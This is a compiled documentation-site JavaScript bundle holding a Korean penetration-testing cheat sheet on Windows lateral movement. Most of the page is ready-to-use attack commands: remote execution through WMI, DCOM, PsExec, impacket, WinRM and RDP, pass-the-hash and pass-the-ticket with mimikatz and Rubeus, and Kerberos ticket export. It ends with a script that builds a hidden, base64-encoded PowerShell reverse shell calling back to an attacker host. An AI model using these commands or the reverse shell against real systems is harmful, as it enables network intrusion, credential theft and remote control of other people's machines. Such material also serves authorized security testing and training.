"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[2449],{2552:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>h,frontMatter:()=>r,metadata:()=>i,toc:()=>d});const i=JSON.parse('{"id":"cheatsheet/post-exploitation/lateral-movement","title":"Lateral Movement","description":"\ub124\ud2b8\uc6cc\ud06c \ub0b4\uc5d0\uc11c \ub2e4\ub978 \uc2dc\uc2a4\ud15c\uc73c\ub85c \uc774\ub3d9\ud558\ub294 \uae30\ubc95\uc785\ub2c8\ub2e4.","source":"@site/docs/cheatsheet/post-exploitation/lateral-movement.md","sourceDirName":"cheatsheet/post-exploitation","slug":"/cheatsheet/post-exploitation/lateral-movement","permalink":"/my-docusaurus-page/cheatsheet/post-exploitation/lateral-movement","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"Active Directory","permalink":"/my-docusaurus-page/cheatsheet/post-exploitation/active-directory"},"next":{"title":"Payloads","permalink":"/my-docusaurus-page/category/payloads"}}');var t=s(4848),a=s(8453);const r={sidebar_position:2},l="Lateral Movement",c={},d=[{value:"WMI (Windows Management Instrumentation)",id:"wmi-windows-management-instrumentation",level:2},{value:"wmic",id:"wmic",level:3},{value:"PowerShell WMI",id:"powershell-wmi",level:3},{value:"DCOM (Distributed Component Object Model)",id:"dcom-distributed-component-object-model",level:2},{value:"CIM \uc138\uc158",id:"cim-\uc138\uc158",level:3},{value:"PSExec",id:"psexec",level:2},{value:"Sysinternals PSExec",id:"sysinternals-psexec",level:3},{value:"impacket-psexec",id:"impacket-psexec",level:3},{value:"WinRM",id:"winrm",level:2},{value:"PowerShell Remoting",id:"powershell-remoting",level:3},{value:"evil-winrm",id:"evil-winrm",level:3},{value:"RDP",id:"rdp",level:2},{value:"xfreerdp",id:"xfreerdp",level:3},{value:"rdesktop",id:"rdesktop",level:3},{value:"SMB",id:"smb",level:2},{value:"smbclient",id:"smbclient",level:3},{value:"Pass-the-Hash",id:"pass-the-hash",level:2},{value:"impacket",id:"impacket",level:3},{value:"CrackMapExec / NetExec",id:"crackmapexec--netexec",level:3},{value:"Pass-the-Ticket",id:"pass-the-ticket",level:2},{value:"mimikatz",id:"mimikatz",level:3},{value:"Rubeus",id:"rubeus",level:3},{value:"Payload \uc778\ucf54\ub529",id:"payload-\uc778\ucf54\ub529",level:2},{value:"PowerShell Reverse Shell",id:"powershell-reverse-shell",level:3},{value:"\uc0ac\uc6a9",id:"\uc0ac\uc6a9",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function o(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"lateral-movement",children:"Lateral Movement"})}),"\n",(0,t.jsx)(n.p,{children:"\ub124\ud2b8\uc6cc\ud06c \ub0b4\uc5d0\uc11c \ub2e4\ub978 \uc2dc\uc2a4\ud15c\uc73c\ub85c \uc774\ub3d9\ud558\ub294 \uae30\ubc95\uc785\ub2c8\ub2e4."}),"\n",(0,t.jsx)(n.h2,{id:"wmi-windows-management-instrumentation",children:"WMI (Windows Management Instrumentation)"}),"\n",(0,t.jsx)(n.h3,{id:"wmic",children:"wmic"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-cmd",children:'# \ud504\ub85c\uc138\uc2a4 \uc0dd\uc131\nwmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"\nwmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "powershell -enc <BASE64>"\n\n# \uc6d0\uaca9 \uba85\ub839 \uc2e4\ud589\nwmic /node:<RHOST> /user:<DOMAIN>\\<USERNAME> /password:<PASSWORD> process call create "cmd.exe /c whoami > C:\\output.txt"\n'})}),"\n",(0,t.jsx)(n.h3,{id:"powershell-wmi",children:"PowerShell WMI"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# \uc790\uaca9\uc99d\uba85 \uc800\uc7a5\n$username = '<USERNAME>'\n$password = '<PASSWORD>'\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\n# \uba85\ub839 \uc2e4\ud589\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd\" -ComputerName <RHOST> -Credential $credential\n\n# Get-WmiObject\nGet-WmiObject -Class Win32_Process -ComputerName <RHOST> -Credential $credential\n"})}),"\n",(0,t.jsx)(n.h2,{id:"dcom-distributed-component-object-model",children:"DCOM (Distributed Component Object Model)"}),"\n",(0,t.jsx)(n.h3,{id:"cim-\uc138\uc158",children:"CIM \uc138\uc158"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# \uc790\uaca9\uc99d\uba85 \uc124\uc815\n$username = '<USERNAME>'\n$password = '<PASSWORD>'\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\n# DCOM \uc138\uc158\n$options = New-CimSessionOption -Protocol DCOM\n$session = New-CimSession -ComputerName <RHOST> -Credential $credential -SessionOption $options\n\n# \uba85\ub839 \uc2e4\ud589\n$command = 'powershell -enc <BASE64>'\nInvoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command}\n"})}),"\n",(0,t.jsx)(n.h2,{id:"psexec",children:"PSExec"}),"\n",(0,t.jsx)(n.h3,{id:"sysinternals-psexec",children:"Sysinternals PSExec"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-cmd",children:"# \uae30\ubcf8 \uc0ac\uc6a9\nPsExec.exe \\\\<RHOST> -u <DOMAIN>\\<USERNAME> -p <PASSWORD> cmd\n\n# \uc2dc\uc2a4\ud15c \uad8c\ud55c\nPsExec.exe \\\\<RHOST> -u <DOMAIN>\\<USERNAME> -p <PASSWORD> -s cmd\n\n# \ud30c\uc77c \ubcf5\uc0ac \ubc0f \uc2e4\ud589\nPsExec.exe \\\\<RHOST> -u <DOMAIN>\\<USERNAME> -p <PASSWORD> -c payload.exe\n"})}),"\n",(0,t.jsx)(n.h3,{id:"impacket-psexec",children:"impacket-psexec"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# \ube44\ubc00\ubc88\ud638 \uc778\uc99d\nimpacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>\n\n# Pass-the-Hash\nimpacket-psexec -hashes :<NTHASH> <DOMAIN>/<USERNAME>@<RHOST>\n\n# Kerberos\nexport KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass <DOMAIN>/<USERNAME>@<RHOST>\n"})}),"\n",(0,t.jsx)(n.h2,{id:"winrm",children:"WinRM"}),"\n",(0,t.jsx)(n.h3,{id:"powershell-remoting",children:"PowerShell Remoting"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# \uc790\uaca9\uc99d\uba85\n$username = '<USERNAME>'\n$password = '<PASSWORD>'\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n\n# \uc138\uc158 \uc0dd\uc131\n$session = New-PSSession -ComputerName <RHOST> -Credential $credential\n\n# \uba85\ub839 \uc2e4\ud589\nInvoke-Command -Session $session -ScriptBlock { whoami }\nInvoke-Command -Session $session -ScriptBlock { Get-Process }\n\n# \ub300\ud654\ud615 \uc138\uc158\nEnter-PSSession -Session $session\n\n# \uc138\uc158 \uc885\ub8cc\nRemove-PSSession -Session $session\n"})}),"\n",(0,t.jsx)(n.h3,{id:"evil-winrm",children:"evil-winrm"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc5f0\uacb0\nevil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>\n\n# Pass-the-Hash\nevil-winrm -i <RHOST> -u <USERNAME> -H <NTHASH>\n\n# SSL\nevil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD> -S\n\n# \uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589\nevil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD> -s /path/to/scripts\n"})}),"\n",(0,t.jsx)(n.h2,{id:"rdp",children:"RDP"}),"\n",(0,t.jsx)(n.h3,{id:"xfreerdp",children:"xfreerdp"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc5f0\uacb0\nxfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST>\n\n# \ub3c4\uba54\uc778 \uc778\uc99d\nxfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<RHOST>\n\n# Pass-the-Hash\nxfreerdp /u:<USERNAME> /pth:<NTHASH> /v:<RHOST>\n\n# \ub4dc\ub77c\uc774\ube0c \uacf5\uc720\nxfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /drive:share,/tmp\n\n# \ud074\ub9bd\ubcf4\ub4dc \uacf5\uc720\nxfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> +clipboard\n\n# \uc804\uccb4 \ud654\uba74\nxfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /f\n"})}),"\n",(0,t.jsx)(n.h3,{id:"rdesktop",children:"rdesktop"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"rdesktop -u <USERNAME> -p <PASSWORD> <RHOST>\nrdesktop -u <USERNAME> -p <PASSWORD> -d <DOMAIN> <RHOST>\n"})}),"\n",(0,t.jsx)(n.h2,{id:"smb",children:"SMB"}),"\n",(0,t.jsx)(n.h3,{id:"smbclient",children:"smbclient"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# \uc5f0\uacb0\nsmbclient //<RHOST>/<SHARE> -U <USERNAME>\n\n# Pass-the-Hash\nsmbclient //<RHOST>/<SHARE> -U <USERNAME> --pw-nt-hash <NTHASH>\n\n# \uba85\ub839 \uc2e4\ud589 (impacket)\nsmbexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>\nsmbexec.py -hashes :<NTHASH> <DOMAIN>/<USERNAME>@<RHOST>\n"})}),"\n",(0,t.jsx)(n.h2,{id:"pass-the-hash",children:"Pass-the-Hash"}),"\n",(0,t.jsx)(n.h3,{id:"impacket",children:"impacket"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# PSExec\nimpacket-psexec -hashes :<NTHASH> Administrator@<RHOST>\n\n# WMIExec\nimpacket-wmiexec -hashes :<NTHASH> Administrator@<RHOST>\n\n# SMBExec\nimpacket-smbexec -hashes :<NTHASH> Administrator@<RHOST>\n\n# DCOMExec\nimpacket-dcomexec -hashes :<NTHASH> Administrator@<RHOST>\n"})}),"\n",(0,t.jsx)(n.h3,{id:"crackmapexec--netexec",children:"CrackMapExec / NetExec"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'netexec smb <RHOST> -u Administrator -H <NTHASH>\nnetexec smb <RHOST> -u Administrator -H <NTHASH> -x "whoami"\n'})}),"\n",(0,t.jsx)(n.h2,{id:"pass-the-ticket",children:"Pass-the-Ticket"}),"\n",(0,t.jsx)(n.h3,{id:"mimikatz",children:"mimikatz"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-cmd",children:"# \ud2f0\ucf13 \ucd94\ucd9c\nsekurlsa::tickets /export\n\n# \ud2f0\ucf13 \uc8fc\uc785\nkerberos::ptt ticket.kirbi\n\n# \ud655\uc778\nklist\n\n# \uc811\uadfc\ndir \\\\<DC>\\c$\n"})}),"\n",(0,t.jsx)(n.h3,{id:"rubeus",children:"Rubeus"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-cmd",children:"# \ud2f0\ucf13 \ucd94\ucd9c\n.\\Rubeus.exe dump /nowrap\n\n# \ud2f0\ucf13 \uc8fc\uc785\n.\\Rubeus.exe ptt /ticket:<BASE64>\n"})}),"\n",(0,t.jsx)(n.h2,{id:"payload-\uc778\ucf54\ub529",children:"Payload \uc778\ucf54\ub529"}),"\n",(0,t.jsx)(n.h3,{id:"powershell-reverse-shell",children:"PowerShell Reverse Shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'# revshell_encoder.py\nimport sys\nimport base64\n\npayload = \'$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\'\n\ncmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode(\'utf16\')[2:]).decode()\n\nprint(cmd)\n'})}),"\n",(0,t.jsx)(n.h3,{id:"\uc0ac\uc6a9",children:"\uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"python3 revshell_encoder.py\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-cmd",children:"powershell -nop -w hidden -e <BASE64>\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"WMI\ub294 \ud3ec\ud2b8 135, 445 \uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.li,{children:"DCOM\uc740 \ud3ec\ud2b8 135 \uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.li,{children:"WinRM\uc740 \ud3ec\ud2b8 5985 (HTTP), 5986 (HTTPS) \uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.li,{children:"RDP\ub294 \ud3ec\ud2b8 3389 \uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.li,{children:"PSExec\ub294 \ud3ec\ud2b8 445 \uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.li,{children:"Pass-the-Hash\ub294 NTLM \ud574\uc2dc\ub85c \uc778\uc99d"}),"\n",(0,t.jsx)(n.li,{children:"Pass-the-Ticket\uc740 Kerberos \ud2f0\ucf13 \uc0ac\uc6a9"}),"\n",(0,t.jsx)(n.li,{children:"\ubaa8\ub4e0 \uae30\ubc95\uc740 \uc801\uc808\ud55c \uad8c\ud55c \ud544\uc694"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>l});var i=s(6540);const t={},a=i.createContext(t);function r(e){const n=i.useContext(a);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),i.createElement(a.Provider,{value:n},e.children)}}}]);